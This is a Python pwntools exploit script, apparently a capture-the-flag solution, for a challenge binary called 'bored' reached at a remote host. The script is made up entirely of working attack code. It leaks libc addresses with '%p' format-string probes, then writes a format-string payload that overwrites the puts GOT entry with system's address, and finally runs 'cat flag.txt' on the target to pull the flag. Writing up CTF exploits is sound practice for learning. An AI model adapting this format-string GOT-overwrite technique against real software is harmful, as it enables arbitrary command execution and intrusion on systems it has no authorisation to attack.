#!/usr/bin/env python3
from pwn import *
import time
pwnencode = lambda x: str(x).encode()

host,port = 'spclr.ch',7331
elf = ELF('./bored')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
puts_got = elf.sym['got.puts']
gdbscript =\
"""
b *(main + 183)
b *(main + 188)
continue
"""
local = False
done = False
while not done:
    try:
        p = elf.process() if local else remote(host,port)
        # p = gdb.debug([elf.path], gdbscript) if local else remote(host,port)
        p.recvuntil(b'...\n')
                                                                            # leak libc by leaking address of __libc_read
        p.sendline(b'%p %p %p %p')
        buf = p.recvline().rstrip().split(b' ')[-2][2:]
        read_libc = int(buf,16)-18
        libc.address = read_libc - libc.sym['read']
        system_addr = libc.sym['system']
        print(f'is this your libc?: {hex(libc.address)}')
        if libc.address < 0:
            time.sleep(1)
            p.close()
            continue
        p.recvuntil(b'...\n')
                                                                            # two fmt string params to write to bits [15:0] and [23:16] (h'0000 0000 00XX XXXX)
                                                                            # pointed to by args 11 and 12 on the stack (puts@got)
                                                                            # using math && __libc_system address && the leak
        target_param = 11
        payload =  pwnencode(f'%{libc.sym.system & 0xffff}x')
        payload += pwnencode(f'%{target_param}$hn')                         # to overwrite bits [15:0] with system_addr[15:0]
        payload += pwnencode(f'%{((libc.sym.system >> 16) & 0xff)-0x10}x')  
        payload += pwnencode(f'%{target_param+1}$hhn')                      # to overwrite bits[23:16] with system_addr[23:16] (also adjusting for num. charachters printed so far)
        payload += b'\x90'*(len(payload)%8+16)
        payload += p64(puts_got)                                            # printf argument to overwrite bottom bits[15:0]
        payload += p64(puts_got+2)                                          # printf argument to overwrite bits [23:16]
        p.sendline(payload)
        p.clean()
        # p.interactive()
        """
        Everything after this can be commented out to avoid looping.
        Just uncomment p.interactive()
        """
        time.sleep(1)
        p.sendline(b'cat flag.txt')
        p.clean()
        flag = p.recvline().rstrip()
        flagidx = flag.index(b'ictf')
        flag = flag[flagidx:].decode()
        if 'ictf' in flag:
            print(f'flag: {flag}')
            done = True
            break
    except Exception as e:
        print(f'Exception: {e}')
        if p.connected():
            p.close()
    if p.connected():
        p.close()
